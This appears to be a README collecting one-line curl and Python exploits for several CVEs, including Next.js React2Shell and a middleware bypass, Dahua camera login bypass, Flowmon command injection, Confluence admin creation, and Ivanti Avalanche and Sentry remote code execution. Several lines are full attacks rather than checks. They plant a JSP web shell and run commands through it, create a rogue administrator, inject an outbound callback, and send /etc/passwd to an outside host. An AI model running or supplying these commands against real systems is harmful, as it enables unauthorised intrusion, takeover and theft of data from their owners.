# vuln-liners
One line vulnerability tests!

## CVE-2025-55182/CVE-2025-66478 (React2Shell RCE)
`curl -s -w "\n%{http_code}" -X POST "https://<IP>/" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0" \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: zAiFWcwUECAo-ZSIOf4mU" \
  -H "Next-Router-State-Tree: %7B%7D" \
  -H "X-Nextjs-Html-Request-Id: 1764881245363-58fca15846c3" \
  -F "1={}" \
  -F '0=["$1:aa:aa"]' \
  -k | tee /tmp/response.txt | tail -1 | grep -q "500" && \
  grep 'E{"digest"' /tmp/response.txt > /dev/null && echo "[VULNERABLE]" || echo "[NOT VULNERABLE]"`

## CVE-2025-29927 (Next.js Authorization Bypass):
`curl -Liksv http://localhost:3000/private --header 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'`

`curl -Liksv http://localhost:3000/private --header 'X-Middleware-Subrequest: x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'`

## CVE-2021-33044, CVE-2021-33045 (Dahua IP Camera Authentication Bypass):
`curl -Liksv http://<IP>/RPC2_Login --header "Host: <IP>:<PORT>" --header "User-Agent: Mozilla/5.0 (SS; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" --header "Accept: application/json, text/javascript, */*; q=0.01" --header "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --header "Origin: http://<IP>/" --header "Referer: http://<IP>/" --header "X-Requested-With: XMLHttpRequest" --header "Accept-Encoding: gzip" -d "{"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}"`

## CVE-2024-2389 (Progress Kemp Flowmon):
`curl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&file=`curl+IP+PORT`'`

## CVE-2023-38545
`curl -vvv -x socks5h://localhost:9050 $(python3 -c "print(('A'*10000), end='')")`

## CVE-2023-22515 (Confluence Broken Access Control)
`curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://confluence/setup/setupadministrator.action`

## CVE-2023-32563 (Ivanti Avalanche Pre-auth)
`curl -v http://x.x.x.x:1900/Servlet/Skins -F guid=../../../Web/webapps/ROOT -F "file=@-;filename=x.jsp" <<<'<%Runtime.getRuntime().exec(request.getParameter("c"));%>' -: -k https://x.x.x.x:8443/x.jsp -d c=mspaint.exe`

## CVE-2023-38035 (Ivanti Sentry API Authentication Bypass)
`python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd https://x.x.x.x', 'isRoot': True}, None)"`
